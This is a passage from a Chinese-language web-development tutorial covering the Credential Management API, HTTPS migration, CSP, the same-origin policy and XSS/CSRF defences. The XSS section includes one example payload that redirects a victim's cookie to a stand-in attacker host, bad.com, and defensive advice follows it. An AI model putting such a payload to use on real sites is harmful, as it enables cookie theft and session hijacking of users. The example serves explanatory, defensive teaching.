// 在这样的配置下，账号选择器可能会返回
// `PasswordCredential` 或 `FederatedCredential` 的凭证
navigator.credentials.get({
    password: true,
    federated: {
        providers: ['https://www.baidu.com']
    }
})
.then(cred => {
    // cred 可能为 undefined
    if (cred) {
        switch (cred.type) {
            case 'password':
                // 对 PasswordCredential 凭证进行处理
            // ...
        }
    }
});
```

点击登录按钮之后，采用 AJAX 方式提交登录信息。AJAX 请求返回如下：

```js
{
    "name": "测试名",
    "icon": "https://lavas-project.github.io/pwa-demo/credential-demo/images/logo-48x48.png"
}
```


然后，调用凭证管理 API 进行登录信息存储后跳转至登录成功页，代码如下：

```js
// fetch('./login.json') 为假装登录并获取登录信息
fetch('./login.json')
.then(res => {
    if (res.status === 200) {
        return res.json();
    }

    return Promise.reject(res.status);
})
// 此处假装登录成功
.then(data => {
    // 此处调用凭证管理 API 进行登录信息存储
    if (navigator.credentials) {
        // 生成密码凭据
        let cred = new PasswordCredential({
            id: usr.value,
            password: pwd.value,
            name: data.name,
            iconURL: data.icon
        });
        // 登录信息存储
        return navigator.credentials.store(cred)
            .then(() => {
                return data;
            });
    }

    return Promise.resolve(data);
})
// 存储完成后再跳转至登录成功页
.then(data => {
    window.location.href = './main.html?from=login&username=' + data.name;
});
```


在存储至少一个登录信息的情况下重新打开登录页，将自动弹出账户选择器, 如果有多个账户的时候，则列表显示多个账户.

点击对应的账户，会自动将账户信息填充至登录表单。这个填充过程实际上是开发者自己控制的，我们也可以拿到账户信息之后，直接去自动登录。对应账户信息获取及填充表单的代码如下：


```js
// 获取登录凭证
if (navigator.credentials) {
    navigator.credentials.get({
        password: true
    })
    .then(cred => {
        if (cred) {

            switch (cred.type) {
                case 'password':
                    // 此处为自动填充表单的代码
                    // 开发者可以根据实际需要对账户信息进行其他处理
                    usr.value = cred.id;
                    pwd.value = cred.password;
                    break;
                default:
                    break;
            }
        }
    });
}
```


在只有一个登录信息的情况下再次打开登录页，将出现自动登录提示信息.

在登录成功页点击退出登录按钮，则自动注销当前凭证，在下次打开登录页时，将会重新弹出账号选择器，而不会自动登录了。注销凭证的代码如下：

```js
// 点击按钮触发注销凭证事件
$btn.addEventListener('click', () => {
    // 注销凭证
    navigator.credentials.requireUserMediation()
        .then(afterLogout)
        .catch(afterLogout);
});
```


### 6.4. 第三方登录凭证管理

对于用户而言，注册账号密码是一件非常麻烦的事情，不但注册过程繁琐且花时间，同时也提高了用户的账号维护成本。因此如果网站能够提供第三方登录，让用户能够直接复用一些现有且常用的网站账号，将能够大大提高用户体验。


#### 6.4.1 接入第三方登录API

一些大型的站点平台都会开放相应的第三方登录接口和说明文档，如国内的有：

- 百度账号接入指南：http://developer.baidu.com
- 新浪微博接入指南：http://open.weibo.com
- 微信账号接入指南：https://open.weixin.qq.com
- QQ账号接入指南：https://connect.qq.com/intro/login

国外的有：

- google：https://developers.google.cn/identity/sign-in/web/
- facebook：https://developers.facebook.com/docs/facebook-login
- twitter：https://dev.twitter.com/web/sign-in/implementing
- github：https://developer.github.com/v3/oauth/


#### 6.4.2 保存第三方登录凭证

需要调用方法 navigator.credentials.store()进行第三方登录凭证存储，只不过存入的凭证类型为FederatedCredential。FederatedCredential同样实现了Credential接口，同时还新增了provider字段作为第三方登录提供方的标识符。
因此，FederatedCredential初始化参数对象包含以下信息：

- id: 必须 账户名
- provider: 必须 第三方登录提供方网址
- name: 非必需 用户名
- iconURL: 非必需 用户头像

其中 provider 要求必须是完整的带协议头的 URL 地址。我们可以在控制台做如下实验：

```js
new FederatedCredential({id:'123',provider:'https://wwww.baidu.com',name:'test'})
```


浏览器会校验 provider 的格式，当格式不符合 URL 格式时会抛出错误。可以使用 FederatedCredential 对第三方登录信息进行存储啦。

```js
thirdPartyLogin()
    .then(function (profile) {
        if (navigator.credentials) {
            let cred = new FederatedCredential({
                id: profile.email,
                provider: THIRD_PARTY_PROVIDER,
                name: profile.name,
                iconUrl: profile.iconUrl
            });

            return navigator.credentials.store(cred);
        }

        return profile;
    })
    .then(function (profile) {
        // 后续操作
    })
    .catch(function (err) {
        // 错误处理
    });
```

#### 6.4.3 读取第三方登录凭证

需要调用方法 navigator.credentials.get() 方法进行第三方登录凭证的读取。

navigator.credentials.get(options) 方法传入参数包含一个字段 federated，可以通过这个字段去读取第三方登录的凭证信息。

options.federated: 第三方登录 {Object}
providers: {Array} 联合登录账号供应者 id 组成的数组

例如：

```js
navigator.credentials.get({
    federated: {
        providers: ['https://www.baidu.com', 'https://www.weibo.com', 'https://www.github.com']
    }
});
```


这些 providers 需要与 FederatedCredential 第三方登录凭证信息的 provider 相一致。

这样假设存入的第三方登录凭证如下：


```js
let cred = new FederatedCredential({
    id: '123456',
    provider: 'https://www.baidu.com',
    name: '测试百度用户名',
    iconUrl: 'path-to-icon'
});
```
则在弹出的账号选择列表中，就可以看到如下所示的账号信息：

![第三方登录凭证信息](/images/only-third-party.jpg)


不同于密码凭证信息，第三方登录凭证信息会拿 id 字段作为账号的标识。

对于不同的第三方登录具有不同的处理方式，因此在获取到第三方登录凭证信息之后，需要通过 type 和  provider 字段进行凭证信息分类处理，如：

```js
navigator.credentials.get({
    password: true,
    federated: {
        providers: ['https://www.baidu.com', 'https://www.weibo.com']
    }
})
.then(function (cred) {
    if (cred) {
        switch (cred.type) {
            case 'password':
            // PasswordCredential 凭证处理
            case 'federated':
                // FederatedCredential 凭证处理
                switch (cred.provider) {
                    case 'https://www.baidu.com':
                        // 调起百度第三方登录
                    case 'https://www.weibo.com':
                        // 调起微博第三方登录
                }
        }
    }
});
```

## 7. web安全

### 7.1 使用https

HTTPS（全称：Hyper Text Transfer Protocol over Secure Socket Layer），是以安全为目标的HTTP通道，简单讲是HTTP的安全版。即HTTP下加入SSL层，HTTPS的安全基础是SSL，因此加密的详细内容就需要SSL。 它是一个URI scheme（抽象标识符体系），句法类同http:体系。用于安全的HTTP数据传输。https:URL表明它使用了HTTP，但HTTPS存在不同于HTTP的默认端口及一个加密/身份验证层（在HTTP与TCP之间）。

HTTPS 的主要作用是：

1. 对数据进行加密，并建立一个信息安全通道，来保证传输过程中的数据安全;
2. 对网站服务器进行真实身份认证。

SSL/TLS 协议采用非对称加密方式，服务端会生成公钥和私钥，公钥用来加密信息，可以提供给所有需要进行通信的客户端，私钥保存在本地，不能泄露。客户端使用这份公钥对信息进行加密，将请求发送给服务器，服务器用私钥解密。反之，服务器对客户端的返回，则使用客户端提供的公钥进行加密，客户端使用本地对应的私钥来解密，保证了通信的安全。


详细：https://security.stackexchange.com/questions/20803/how-does-ssl-tls-work

基于 SSL/TLS 进行 一次的 HTTPS 会话的过程，简单地说可以分成3步

1. 客户端向服务器端索要并验证公钥。
2. 双方协商生成"对话密钥"。
3. 双方采用"对话密钥"进行加密通信。


![HTTPS 会话的过程](/images/https.png)

HTTPS 服务器拥有一张数字证书，包含了经过认证的网站公钥和一些元数据，客户端和服务端通信时，会首先验证证书的有效性，来决定是否继续通信。这样一来，经过了身份认证、信息加密等步骤，网络通信安全就得到了保障。


#### 7.1.1 升级HTTPS

1. 获取证书

HTTPS 是由证书认证机构 CA（Certificate Authority）颁发的、并包含公开密钥拥有者信息、公开密钥、签发者信息、有效期以及一些扩展信息、能提供在互联网上进行身份验证的一种权威性数字文件。要保证数字证书的真实性，必须确保该数字证书是由具有权威性的国际 CA 中心签发的，如 Symantec 就是这样一家通过 Web Trust 认证的国际 CA。购买 CA 颁发的证书有很多类型，分为域名认证、公司认证、扩展认证三个级别，还分成单域名、通配符、多域名三种覆盖范围。认证级别越高、覆盖范围越广的证书，价格越贵。

2. 在服务器安装证书

可以将证书文件存放在 ect/ssl 目录，然后选择对应的服务器进行配置，使用 Mozilla 便捷的配置生成器https://www.w3.org/TR/CSP/

3. 重定向配置

将 HTTP 的访问请求 301 到 HTTPS

Nginx

```text
server {
    listen 80;
    server_name domain.com www.domain.com;
    return 301 https://domain.com$request_uri;
}
```

Apache （.htaccess文件）

```text
RewriteEngine On
RewriteCond %{HTTPS} off
RewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI} [R=301,L]
```


4. 修改资源链接

将站点所有的 HTTP 资源地址替换成 HTTPS，一个比较好的方法是直接将协议头替换成 //，这样浏览器会自动根据当前页面的协议加载相同协议头的资源，更为灵活。例如：

<script src="http://a.com/jquery.js"></script>
改为

<script src="//a.com/jquery.js"></script>

如果修改不完全，HTTPS 资源和 HTTP 资源混合出现，即页面包含混合内容，浏览器将警告用户已失去 HTTPS 的全部能力（直观的看，地址栏 HTTPS 的标识将处于失效状态）。事实上，如果是主动混合内容（脚本、插件、CSS、iframe），则浏览器通常根本不会加载或执行此内容，从而导致页面残缺。


5. 可以进一步保证安全：设置 Cookie 安全标记

如果用户的身份验证 Cookie 在明文中暴露，则整个会话的安全保障将被破坏，因此，应该确保浏览器只在使用 HTTPS 时，才发送 Cookie。

在网站响应头里面，Set-Cookie字段加上Secure标志即可。

Set-Cookie: LSID=DQAAAK...Eaem_vYg; Secure

#### 7.1.2 避免 HTTPS 站点出现混合内容

混合内容（Mixed Content）：初始 HTML 内容通过安全的 HTTPS 连接加载，但其他资源（例如，图像、视频、样式表、脚本）则通过不安全的 HTTP 连接加载，即在同一个页面同时混合加载了 HTTP 和 HTTPS 资源。


混合内容的存在会降低整个页面的安全性，因为这些请求容易受到 XSS，中间人等各种攻击。用户看到这些 Warning 的时候，如果存在威胁，很有可能已经被攻击。所以开发者有义务将资源替换成 HTTPS，减少安全风险。


鉴于上述威胁，浏览器最好是阻止所有混合内容。但这极易导致大量站点不可用。当前的折衷做法是阻止最危险的混合内容类型，同时仍允许请求不太危险的混合内容类型。现代浏览器遵循混合内容规范，定义了可选择性地阻止的内容和可阻止的内容类别。


根据此规范，当前可选择性阻止的内容中仅包括图像、视频和音频资源以及预获取这些资源的链接等。随着时间的推移，此类别可能会缩小。可选择性阻止的内容以外的所有内容被视为可阻止的内容，将被浏览器阻止。


#### 7.1.3 批量处理 HTTPS 站点中的混合内容


1. 使用 CSP 查找混合内容

给网站设置响应头：

```text
Content-Security-Policy-Report-Only: default-src https: 'unsafe-inline' 'unsafe-eval'; report-uri https://example.com/reportingEndpoint
```

2. 自动升级不安全的请求

可以使用 CSP 的 upgrade-insecure-requests 配置项，浏览器在请求 http 资源时，会自动升级请求对应的 https 资源。

如，配置请求头

```text
Content-Security-Policy: upgrade-insecure-requests
```


或，使用meta标签

```text
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
```

都能使浏览器对 <img src="http://example.com/image.jpg"> 的请求转向 https://example.com/image.jpg。但注意，这时需要保证升级后的资源地址可用，不然就会请求失败。



3.阻止所有混合内容

配置请求头

```text
Content-Security-Policy: block-all-mixed-content
```
或，使用meta标签

```text
<meta http-equiv="Content-Security-Policy" content="block-all-mixed-content">
```
将导致所有不安全的混合内容被浏览器阻止，但这个存在"误杀"的风险，慎重使用。


### 7.2 同源策略

浏览器的同源策略是 Web 安全的基石，它对从一个源加载的文档或脚本如何与来自另一个源的资源进行交互做出了限制。

如果协议，端口和主机对于两个页面是相同的，则两个页面具有相同的源。

#### 7.2.1 一些内嵌资源不受限制

- <script src="..."></script> 标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。

- <link rel="stylesheet" href="..."> 标签嵌入CSS。

- <img> 嵌入图片。

- <video> 和 <audio> 嵌入多媒体资源。

- <object>, <embed> 和 <applet>的插件。

- @font-face 引入的字体。一些浏览器允许跨域字体（ cross-origin fonts），一些需要同源字体（same-origin fonts）。

- <frame> 和 <iframe>载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。


#### 7.2.2 限制范围

非同源的网站，主要有3种行为受到限制

1. 无法共享 cookie, localStorage, indexDB
2. 无法操作彼此的 DOM 元素
3. 无法发送 Ajax 请求

同源策略做了很严格的限制，但在实际的场景中，又确实有很多地方需要突破同源策略的限制，也就是我们常说的跨域。

规避上述限制，实现跨域通信的解决方案有多种，如 CORS，JSONP，使用window.name，使用window.postMessage 等，这里就不一一展开讲了。


### 7.3 典型的安全漏洞

Web 典型的安全漏洞种类很多，如 XSS, CSRF, SQL注入,Cross IFrame Trick, clickJacking, 文件上传 等等。下面列举两种客户端常见的安全漏洞。

#### 7.3.1 XSS

XSS (Cross Site Scripting)，跨站脚本攻击。攻击者往 Web 页面里注入恶意代码，当用户浏览这些网页时，就会执行其中的恶意代码，可对用户进行盗取 cookie 信息、会话劫持、改变网页内容、恶意跳转等各种攻击。XSS 是常见的 Web 攻击技术之一，由于跨站脚本漏洞易于出现且利用成本低，所以被 OWASP 列为当前的头号 Web 安全威胁。

在 a.com 的搜索输入框中输入如下内容，并提交请求

```js
<script>location.href=http://www.bad.com/?cookie=document.cookie</script>
```
如果前端没有进行过滤，浏览器地址可能变为：

```js
http://www.a.com/?query=<script>location.href=http://www.bad.com/?cookie=document.cookie</script>
```

此时，用户的 cookie 信息已经被发送到攻击者的服务器，攻击者便能利用收集的 cookie 信息来伪造用户身份，进行多种恶意非法操作.

XSS 攻击类型一般分为三种：

- 反射型 XSS:反射型 XSS 只是简单的把用户输入的数据“反射”给浏览器，XSS 脚本出现在 URL 请求参数里，也就是说需要诱使用户“点击”一个恶意链接，才能攻击成功。反射型 XSS 也叫作非持久型 XSS。

- 储存型 XSS:存储型 XSS 也被称为持久型 XSS，当攻击者输入一段恶意脚本后，被服务端接受保存，当用户访问这个页面时，恶意脚本就会被执行，从而造成漏洞。

- DOM Based XSS:基于 DOM 的 XSS，通过对具体 DOM 代码进行分析，根据实际情况构造 DOM 节点进行 XSS 跨站脚本攻击。

> 防范 XSS

对于 XSS 攻击，我们可以做如下防范：

- 输入过滤。永远不要相信用户的输入，对用户输入的数据做一定的过滤。如输入的数据是否符合预期的格式，比如日期格式，Email 格式，电话号码格式等等。同时，后台服务器需要在接收到用户输入的数据后，对特殊危险字符进行过滤或者转义处理，然后再存储到数据库中。

- 输出编码。服务器端输出到浏览器的数据，可以使用系统的安全函数来进行编码或转义来防范 XSS 攻击。输出 HTML 属性时可以使用 HTML 转义编码（HTMLEncode）进行处理，输出到页面脚本代码中，可以相应进行 Javascript encode 处理。

- HttpOnly Cookie。预防 XSS 攻击窃取用户 cookie 最有效的防御手段。Web 应用程序在设置 cookie 时，将其属性设为 HttpOnly，就可以避免该网页的 cookie 被客户端恶意 JavaScript 窃取，保护用户 cookie 信息。

- WAF(Web Application Firewall)，Web 应用防火墙，主要的功能是防范诸如网页木马、XSS 以及 CSRF 等常见的 Web 漏洞攻击。由第三方公司开发，在企业环境中深受欢迎。

#### 7.3.2 CSRF

CSRF (Cross Site Request Forgery)，即跨站请求伪造。简单的理解是，攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF 能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账等，造成个人隐私泄露，财产损失。

> 防范 CSRF

1. 验证码。应用程序和用户进行交互过程中，特别是账户交易这种核心步骤，强制用户输入验证码，才能完成最终请求。在通常情况下，验证码够很好地遏制 CSRF 攻击。但增加验证码降低了用户的体验，网站不能给所有的操作都加上验证码。所以只能将验证码作为一种辅助手段，在关键业务点设置验证码。

2. Referer Check。HTTP Referer 是 header 的一部分，当浏览器向 Web 服务器发送请求时，一般会带上 Referer 信息告诉服务器是从哪个页面链接过来的，服务器以此可以获得一些信息用于处理。可以通过检查请求的来源来防御 CSRF 攻击。正常请求的 referer 具有一定规律，如在提交表单的 referer 必定是在该页面发起的请求。所以通过检查 http 包头 referer 的值是不是这个页面，来判断是不是 CSRF 攻击。

3. Anti CSRF Token。目前比较完善的解决方案是加入 Anti-CSRF-Token，即发送请求时在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器建立一个拦截器来验证这个 token。服务器读取浏览器当前域 cookie 中这个 token 值，会进行校验该请求当中的 token 和 cookie 当中的 token 值是否都存在且相等，才认为这是合法的请求。否则认为这次请求是违法的，拒绝该次服务。



### 7.4 CSP(内容安全策略)

CSP(Content Security Policy) 即内容安全策略，主要目标是减少、并有效报告 XSS 攻击，其实质就是让开发者定制一份白名单，告诉浏览器允许加载、执行的外部资源。即使攻击者能够发现可从中注入脚本的漏洞，由于脚本不在白名单之列，浏览器也不会执行该脚本，从而达到了降低客户端遭受 XSS 攻击风险和影响的目的。

默认配置下，CSP 甚至不允许执行内联代码 (<script> 块内容，内联事件，内联样式)，以及禁止执行eval(), setTimeout 和 setInterval。为什么要这么做呢？因为制定来源白名单依旧无法解决 XSS 攻击的最大威胁：内联脚本注入。浏览器无法区分合法内联脚本与恶意注入的脚本，所以通过默认禁止内联脚本来有效解决这个问题。

事实上我们并不推荐使用内联脚本混合的开发方式，使用外部资源，浏览器更容易缓存，对开发者也容易阅读理解，并且有助于编译和压缩。当然，如果不得不需要内联脚本和样式，可以通过设置 unsafe-inline，来解除这一限制。


#### 7.4.1 启用 CSP

有两种方法配置并启用 CSP

1. 设置 HTTP 头的 Content-Security-Policy 字段（旧版 X-Content-Security-Policy）

```js
Content-Security-Policy: script-src 'self'; object-src 'none';style-src cdn.example.org third-party.org; child-src https:
```

2. 设置页面的 <meta> 标签

```js
<meta http-equiv="Content-Security-Policy" content="script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:">
```

上述例子进行了配置

- script: 只信任当前域名
- bject-src: 不允许加载任何插件资源（如object, embed, applet 等标签引入的 flash 等插件）
- 样式: 只信任来自 cdn.example.org 和 third-party.org
- 框架内容（如 iframe）: 必须使用 https 协议加载

CSP 提供了很多可配置的选项来针对不同资源的加载进行限制，常见的有，

- script-src：外部脚本
- style-src：样式表
- img-src：图像
- media-src：媒体文件（音频和视频）
- font-src：字体文件
- object-src：插件（比如 Flash）
- child-src：框架
- manifest-src：manifest 文件


如果不为某条配置设置具体的值，则默认情况下，该配置在运行时认为你指定 * 作为有效来源（例如，你可以从任意位置加载字体，没有任何限制）。也可以设置 default-src 的值，来代替各个选项的默认值。


每个配置选项的值，可填入以下内容

- 主机名：example.org，https://example.com:443
- 路径名：example.org/resources/js/
- 通配符：*.example.org，*://*.example.com:*（表示任意协议、任意子域名、任意端口）
- 协议名：https:、data:
- 关键字 'self'：当前域名，需要加引号
- 关键字 'none'：禁止加载任何外部资源，需要加引号
- 这里不对资源白名单的配置具体介绍了，更多内容可参阅：https://www.w3.org/TR/CSP/


## 8. 使用 RAIL 模型评估性能

https://developers.google.cn/web/fundamentals/performance/rail

## 9. App Shell 模型

App Shell 架构是构建 Progressive Web App 的一种方式，这种应用能可靠且即时地加载到您的用户屏幕上，与本机应用相似。

App“shell”是支持用户界面所需的最小的 HTML、CSS 和 JavaScript，如果离线缓存，可确保在用户重复访问时提供即时、可靠的良好性能。这意味着并不是每次用户访问时都要从网络加载 App Shell。 只需要从网络中加载必要的内容。


对于使用包含大量 JavaScript 的架构的单页应用来说，App Shell 是一种常用方法。这种方法依赖渐进式缓存 Shell（使用服务工作线程）让应用运行。接下来，为使用 JavaScript 的每个页面加载动态内容。App Shell 非常适合用于在没有网络的情况下将一些初始 HTML 快速加载到屏幕上。

### 9.1 何时使用 App Shell 模型







## 10. LAVAS

















   











